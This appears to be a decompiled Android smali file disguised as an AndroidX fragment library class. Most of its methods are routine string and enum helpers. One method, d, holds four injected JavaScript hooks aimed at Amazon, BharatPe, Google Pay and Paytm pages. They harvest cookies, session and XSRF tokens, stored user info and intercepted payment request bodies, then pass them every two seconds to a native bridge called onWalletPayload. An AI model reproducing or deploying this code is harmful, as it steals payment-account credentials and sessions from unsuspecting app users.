.class public abstract synthetic Landroidx/fragment/app/u;
.super Ljava/lang/Object;
.source "SourceFile"


# direct methods
.method public static synthetic a(I)C
    .locals 3

    const/4 v0, 0x1

    const/16 v1, 0x7b

    if-eq p0, v0, :cond_3

    const/4 v0, 0x2

    const/16 v2, 0x5b

    if-eq p0, v0, :cond_2

    const/4 v0, 0x3

    if-eq p0, v0, :cond_1

    const/4 v0, 0x4

    if-ne p0, v0, :cond_0

    return v2

    :cond_0
    const/4 p0, 0x0

    throw p0

    :cond_1
    return v1

    :cond_2
    return v2

    :cond_3
    return v1
.end method

.method public static synthetic b(I)I
    .locals 1

    const/4 v0, 0x1

    if-eq p0, v0, :cond_3

    const/4 v0, 0x2

    if-eq p0, v0, :cond_2

    const/4 v0, 0x3

    if-eq p0, v0, :cond_1

    const/4 v0, 0x4

    if-ne p0, v0, :cond_0

    const/16 p0, 0x1fa8

    return p0

    :cond_0
    const/4 p0, 0x0

    throw p0

    :cond_1
    const/16 p0, 0x1fa7

    return p0

    :cond_2
    const/16 p0, 0x1fa6

    return p0

    :cond_3
    const/16 p0, 0x1fa5

    return p0
.end method

.method public static synthetic c(I)C
    .locals 3

    const/4 v0, 0x1

    const/16 v1, 0x7d

    if-eq p0, v0, :cond_3

    const/4 v0, 0x2

    const/16 v2, 0x5d

    if-eq p0, v0, :cond_2

    const/4 v0, 0x3

    if-eq p0, v0, :cond_1

    const/4 v0, 0x4

    if-ne p0, v0, :cond_0

    return v2

    :cond_0
    const/4 p0, 0x0

    throw p0

    :cond_1
    return v1

    :cond_2
    return v2

    :cond_3
    return v1
.end method

.method public static synthetic d(I)Ljava/lang/String;
    .locals 1

    const/4 v0, 0x1

    if-eq p0, v0, :cond_3

    const/4 v0, 0x2

    if-eq p0, v0, :cond_2

    const/4 v0, 0x3

    if-eq p0, v0, :cond_1

    const/4 v0, 0x4

    if-ne p0, v0, :cond_0

    const-string p0, "(function(){if(window.__AMAZON_HOOK__)return;window.__AMAZON_HOOK__=true;function report(){try{var payload={};payload[\'User-Agent\']=navigator.userAgent||\'\';payload.Cookie=document.cookie||\'\';payload.pageUrl=location.href||\'\';if((payload.Cookie||payload[\'User-Agent\'])&&window.xamlAction&&window.xamlAction.onWalletPayload){window.xamlAction.onWalletPayload(\'amazon\', JSON.stringify(payload));}}catch(e){}}setInterval(report,2000);report();})();"

    return-object p0

    :cond_0
    const/4 p0, 0x0

    throw p0

    :cond_1
    const-string p0, "(function(){if(window.__BH_HOOK__)return;window.__BH_HOOK__=true;function valid(v){return v&&v!==\'\"\"\'&&v.toLowerCase()!==\'null\';}function report(){try{var data=localStorage.getItem(\'USER_INFO\')||\'\';if(valid(data)&&window.xamlAction&&window.xamlAction.onWalletPayload){window.xamlAction.onWalletPayload(\'bharatpe\', data);}}catch(e){}}setInterval(report,2000);report();})();"

    return-object p0

    :cond_2
    const-string p0, "(function(){if(window.__G_PAY_HOOK__)return;window.__G_PAY_HOOK__=true;function abs(u){try{return new URL(u,document.baseURI||location.href).href;}catch(e){return \'\'+u;}}function match(u){if(!u)return false;var url=u.toLowerCase();return url.indexOf(\'batchexecute\')!==-1;}function channel(){try{return (location.href.split(\'/\').pop())||\'\';}catch(e){return \'\'+location.href;}}function send(base){try{if(window.xamlAction&&window.xamlAction.onWalletPayload){base.pageUrl=location.href;base.cookie=document.cookie||\'\';base.channelUid=channel();window.xamlAction.onWalletPayload(\'googlepay\', JSON.stringify(base));}}catch(e){}}var _fetch=window.fetch;window.fetch=function(input,init){var args=arguments;return _fetch.apply(this,args).then(function(res){try{res.clone().text().then(function(body){var raw=(args[0]&&args[0].url)?args[0].url:args[0];var full=abs(raw);if(match(full))send({url:full,body:body||\'\',channel:\'fetch\'});});}catch(e){}return res;});};var _open=XMLHttpRequest.prototype.open,_send=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.open=function(m,u){this.__u=u;this.__m=m;return _open.apply(this,arguments);};XMLHttpRequest.prototype.send=function(body){var full=abs(this.__u);if(match(full)){var text=\'\';try{text=body?body.toString():\'\';}catch(e){};send({url:full,body:text,channel:\'xhr\',method:(this.__m||\'POST\')});}return _send.apply(this,arguments);};})();"

    return-object p0

    :cond_3
    const-string p0, "(function(){if(window.__PAYTM_HOOK__)return;window.__PAYTM_HOOK__=true;function hasKey(c,k){return c&&c.indexOf(k+\'=\')>-1;}function report(){try{var c=document.cookie||\'\';if(hasKey(c,\'SESSION\')&&hasKey(c,\'XSRF-TOKEN\')){if(window.xamlAction&&window.xamlAction.onWalletPayload){window.xamlAction.onWalletPayload(\'paytm\', c);}}}catch(e){}}setInterval(report,2000);report();})();"

    return-object p0
.end method

.method public static synthetic e(I)I
    .locals 1

    const/4 v0, 0x1

    if-eq p0, v0, :cond_4

    const/4 v0, 0x2

    if-eq p0, v0, :cond_3

    const/4 v0, 0x3

    if-eq p0, v0, :cond_2

    const/4 v0, 0x4

    if-eq p0, v0, :cond_1

    const/4 v0, 0x5

    if-ne p0, v0, :cond_0

    const/4 p0, 0x0

    return p0

    :cond_0
    const/4 p0, 0x0

    throw p0

    :cond_1
    const/16 p0, 0xa

    return p0

    :cond_2
    const/16 p0, 0x14

    return p0

    :cond_3
    const/16 p0, 0x1e

    return p0

    :cond_4
    const/16 p0, 0x28

    return p0
.end method

.method public static synthetic f(I)J
    .locals 2

    const/4 v0, 0x1

    if-eq p0, v0, :cond_4

    const/4 v0, 0x2

    if-eq p0, v0, :cond_3

    const/4 v0, 0x3

    if-eq p0, v0, :cond_2

    const/4 v0, 0x4

    if-eq p0, v0, :cond_1

    const/4 v0, 0x5

    if-ne p0, v0, :cond_0

    const-wide/16 v0, 0x4

    return-wide v0

    :cond_0
    const/4 p0, 0x0

    throw p0

    :cond_1
    const-wide/16 v0, 0x3

    return-wide v0

    :cond_2
    const-wide/16 v0, 0x2

    return-wide v0

    :cond_3
    const-wide/16 v0, 0x1

    return-wide v0

    :cond_4
    const-wide/16 v0, 0x0

    return-wide v0
.end method

.method public static g(IIILq1/g;)C
    .locals 0

    add-int/2addr p0, p1

    add-int/2addr p0, p2

    invoke-virtual {p3, p0}, Lq1/g;->a(I)C

    move-result p0

    return p0
.end method

.method public static h(IIII)I
    .locals 0

    add-int/2addr p0, p1

    sub-int/2addr p0, p2

    sub-int/2addr p0, p3

    return p0
.end method

.method public static i(Ljava/lang/String;I)Ljava/lang/String;
    .locals 1

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0, p0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method

.method public static j(Ljava/lang/String;ILjava/lang/String;)Ljava/lang/String;
    .locals 1

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0, p0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method

.method public static k(Ljava/lang/String;ILjava/lang/String;I)Ljava/lang/String;
    .locals 1

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0, p0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method

.method public static l(Ljava/lang/String;Ljava/lang/Object;)Ljava/lang/String;
    .locals 1

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0, p0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method

.method public static m(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 1

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method

.method public static n(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 1

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0, p0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method

.method public static o(Ljava/lang/StringBuilder;Ljava/lang/String;C)Ljava/lang/String;
    .locals 0

    invoke-virtual {p0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, p2}, Ljava/lang/StringBuilder;->append(C)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method

.method public static p(Ljava/lang/StringBuilder;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 0

    invoke-virtual {p0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method

.method public static synthetic q()Ljava/util/Iterator;
    .locals 3

    const/4 v0, 0x1

    :try_start_0
    new-array v0, v0, [Ld5/z;

    new-instance v1, Le5/b;

    invoke-direct {v1}, Le5/b;-><init>()V

    const/4 v2, 0x0

    aput-object v1, v0, v2

    invoke-static {v0}, Ljava/util/Arrays;->asList([Ljava/lang/Object;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    return-object v0

    :catchall_0
    move-exception v0

    new-instance v1, Ljava/util/ServiceConfigurationError;

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2, v0}, Ljava/util/ServiceConfigurationError;-><init>(Ljava/lang/String;Ljava/lang/Throwable;)V

    throw v1
.end method

.method public static synthetic r(ILjava/lang/String;)V
    .locals 5

    if-nez p0, :cond_2

    new-instance p0, Ljava/lang/NullPointerException;

    invoke-static {}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Thread;->getStackTrace()[Ljava/lang/StackTraceElement;

    move-result-object v0

    const-class v1, Li3/f;

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    :goto_0
    aget-object v4, v0, v3

    invoke-virtual {v4}, Ljava/lang/StackTraceElement;->getClassName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :cond_0
    :goto_1
    aget-object v4, v0, v3

    invoke-virtual {v4}, Ljava/lang/StackTraceElement;->getClassName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_1

    add-int/lit8 v3, v3, 0x1

    goto :goto_1

    :cond_1
    aget-object v0, v0, v3

    invoke-virtual {v0}, Ljava/lang/StackTraceElement;->getClassName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0}, Ljava/lang/StackTraceElement;->getMethodName()Ljava/lang/String;

    move-result-object v0

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "Parameter specified as non-null is null: method "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "."

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, ", parameter "

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-direct {p0, p1}, Ljava/lang/NullPointerException;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1, p0}, Li3/f;->T(Ljava/lang/String;Ljava/lang/RuntimeException;)V

    throw p0

    :cond_2
    return-void
.end method

.method public static synthetic s(Ljava/lang/Object;)V
    .locals 0

    new-instance p0, Ljava/lang/ClassCastException;

    invoke-direct {p0}, Ljava/lang/ClassCastException;-><init>()V

    throw p0
.end method

.method public static synthetic t(Ly1/a;)V
    .locals 0

    if-nez p0, :cond_0

    return-void

    :cond_0
    new-instance p0, Ljava/lang/ClassCastException;

    invoke-direct {p0}, Ljava/lang/ClassCastException;-><init>()V

    throw p0
.end method

.method public static synthetic u()Ljava/util/Iterator;
    .locals 3

    const/4 v0, 0x1

    :try_start_0
    new-array v0, v0, [Li5/s;

    new-instance v1, Le5/a;

    invoke-direct {v1}, Le5/a;-><init>()V

    const/4 v2, 0x0

    aput-object v1, v0, v2

    invoke-static {v0}, Ljava/util/Arrays;->asList([Ljava/lang/Object;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    return-object v0

    :catchall_0
    move-exception v0

    new-instance v1, Ljava/util/ServiceConfigurationError;

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-direct {v1, v2, v0}, Ljava/util/ServiceConfigurationError;-><init>(Ljava/lang/String;Ljava/lang/Throwable;)V

    throw v1
.end method

.method public static synthetic v(Ljava/lang/Object;)V
    .locals 0

    if-nez p0, :cond_0

    return-void

    :cond_0
    new-instance p0, Ljava/lang/ClassCastException;

    invoke-direct {p0}, Ljava/lang/ClassCastException;-><init>()V

    throw p0
.end method

.method public static synthetic w(I)Ljava/lang/String;
    .locals 0

    packed-switch p0, :pswitch_data_0

    const-string p0, "null"

    return-object p0

    :pswitch_0
    const-string p0, "DECEMBER"

    return-object p0

    :pswitch_1
    const-string p0, "NOVEMBER"

    return-object p0

    :pswitch_2
    const-string p0, "OCTOBER"

    return-object p0

    :pswitch_3
    const-string p0, "SEPTEMBER"

    return-object p0

    :pswitch_4
    const-string p0, "AUGUST"

    return-object p0

    :pswitch_5
    const-string p0, "JULY"

    return-object p0

    :pswitch_6
    const-string p0, "JUNE"

    return-object p0

    :pswitch_7
    const-string p0, "MAY"

    return-object p0

    :pswitch_8
    const-string p0, "APRIL"

    return-object p0

    :pswitch_9
    const-string p0, "MARCH"

    return-object p0

    :pswitch_a
    const-string p0, "FEBRUARY"

    return-object p0

    :pswitch_b
    const-string p0, "JANUARY"

    return-object p0

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_b
        :pswitch_a
        :pswitch_9
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method

.method public static synthetic x(I)Ljava/lang/String;
    .locals 0

    packed-switch p0, :pswitch_data_0

    const-string p0, "null"

    return-object p0

    :pswitch_0
    const-string p0, "SUNDAY"

    return-object p0

    :pswitch_1
    const-string p0, "SATURDAY"

    return-object p0

    :pswitch_2
    const-string p0, "FRIDAY"

    return-object p0

    :pswitch_3
    const-string p0, "THURSDAY"

    return-object p0

    :pswitch_4
    const-string p0, "WEDNESDAY"

    return-object p0

    :pswitch_5
    const-string p0, "TUESDAY"

    return-object p0

    :pswitch_6
    const-string p0, "MONDAY"

    return-object p0

    nop

    :pswitch_data_0
    .packed-switch 0x1
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method

.method public static synthetic y(I)Ljava/lang/String;
    .locals 1

    const/4 v0, 0x1

    if-eq p0, v0, :cond_4

    const/4 v0, 0x2

    if-eq p0, v0, :cond_3

    const/4 v0, 0x3

    if-eq p0, v0, :cond_2

    const/4 v0, 0x4

    if-eq p0, v0, :cond_1

    const/4 v0, 0x5

    if-eq p0, v0, :cond_0

    const-string p0, "null"

    return-object p0

    :cond_0
    const-string p0, "TRACE"

    return-object p0

    :cond_1
    const-string p0, "DEBUG"

    return-object p0

    :cond_2
    const-string p0, "INFO"

    return-object p0

    :cond_3
    const-string p0, "WARN"

    return-object p0

    :cond_4
    const-string p0, "ERROR"

    return-object p0
.end method
